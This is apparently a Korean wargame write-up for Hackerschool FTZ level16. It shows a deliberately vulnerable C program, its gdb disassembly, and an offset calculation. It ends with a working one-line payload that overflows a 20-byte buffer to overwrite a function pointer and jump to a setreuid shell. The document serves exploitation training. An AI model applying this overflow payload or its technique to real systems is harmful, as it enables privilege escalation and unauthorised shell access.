Hackerschool FTZ level16
===
~~~c
#include <stdio.h>

 

void shell() {

  setreuid(3097,3097);

  system("/bin/sh");

}

void printit() {

  printf("Hello there!\n");

}

 

main()

{ int crap;

  void (*call)()=printit;

  char buf[20];

  fgets(buf,48,stdin);

  call();

}

~~~

~~~gdb
Dump of assembler code for function main:

0x08048518 <main+0>:    push   ebp

0x08048519 <main+1>:    mov    ebp,esp

0x0804851b <main+3>:    sub    esp,0x38

0x0804851e <main+6>:    mov    DWORD PTR [ebp-16],0x8048500

0x08048525 <main+13>:   sub    esp,0x4

0x08048528 <main+16>:   push   ds:0x80496e8

0x0804852e <main+22>:   push   0x30

0x08048530 <main+24>:   lea    eax,[ebp-56]

0x08048533 <main+27>:   push   eax

0x08048534 <main+28>:   call   0x8048384 <fgets>

0x08048539 <main+33>:   add    esp,0x10

0x0804853c <main+36>:   mov    eax,DWORD PTR [ebp-16]

0x0804853f <main+39>:   call   eax

0x08048541 <main+41>:   leave

0x08048542 <main+42>:   ret

0x08048543 <main+43>:   nop

0x08048544 <main+44>:   nop

0x08048545 <main+45>:   nop

0x08048546 <main+46>:   nop

0x08048547 <main+47>:   nop

0x08048548 <main+48>:   nop

0x08048549 <main+49>:   nop

0x0804854a <main+50>:   nop

0x0804854b <main+51>:   nop

0x0804854c <main+52>:   nop

0x0804854d <main+53>:   nop

0x0804854e <main+54>:   nop

0x0804854f <main+55>:   nop

End of assembler dump.

(gdb) p shell

$1 = {<text variable, no debug info>} 0x80484d0 <shell>
출처: http://savefile.tistory.com/152 [해커 스토리]
~~~
>0x0804851e <main+6>:    mov    DWORD PTR [ebp-16],0x8048500
>0x08048525 <main+13>:   sub    esp,0x4
>0x08048528 <main+16>:   push   ds:0x80496e8
>0x0804852e <main+22>:   push   0x30
>0x08048530 <main+24>:   lea    eax,[ebp-56]
>> 56-16 =40;
공격코드 : (python -c 'print "A"*40+"\xd0\x84\x04\x08"';cat) | ./attackme

